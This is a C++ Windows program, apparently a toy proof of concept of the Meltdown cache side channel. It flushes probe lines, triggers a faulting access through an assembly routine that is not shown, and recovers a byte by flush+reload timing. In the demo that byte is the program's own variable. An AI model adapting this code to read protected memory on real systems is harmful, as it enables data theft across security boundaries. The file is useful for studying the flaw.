#include <stdio.h>
#include <intrin.h>
#include <cstdint>
#include <windows.h>

constexpr int probe_lines = 256;
uint64_t tat[probe_lines];
uint8_t probe[probe_lines * 4096];

extern "C" {
  uint64_t memory_access(void *p);
  void ooe(void *target, void *probe_start, uint32_t *divisor);
}

void meltdown_toy(void *target_address) {
  memset(probe, 0xfe, sizeof(probe));

  uint32_t zero = 0;
  for (int trial = 0; ; ++trial) {
    for (int i = 0; i < 256; ++i)
      _mm_clflush(probe + i * 4096);

    __try {
      ooe(target_address, probe, &zero);
    }
    __except(EXCEPTION_EXECUTE_HANDLER) {
      //printf("%08x\n", GetExceptionCode());
    }

    for (int i = 0; i < probe_lines; ++i)
      tat[i] = memory_access(probe + i * 4096);

    int idx_min = 0;
    for (int i = 0; i < probe_lines; ++i)
      if (tat[i] < tat[idx_min]) idx_min = i;

    if (tat[idx_min] < 100) {
      printf("trial#%d: guess=%02x (score=%llu)\n", trial, idx_min, tat[idx_min]);
      for (int i = 0; i < probe_lines; ++i) {
        if ((i + 1) % 16 == 0)
          printf("% 6llu\n", tat[i]);
        else
          printf("% 6llu", tat[i]);
      }
      break;
    }
  }
}

int main(int argc, char *argv[]) {
  int a = argc >= 2 ? atoi(argv[1]) : 0x42;
  SetProcessAffinityMask(GetCurrentProcess(), 1);
  meltdown_toy(&a);
  return 0;
}
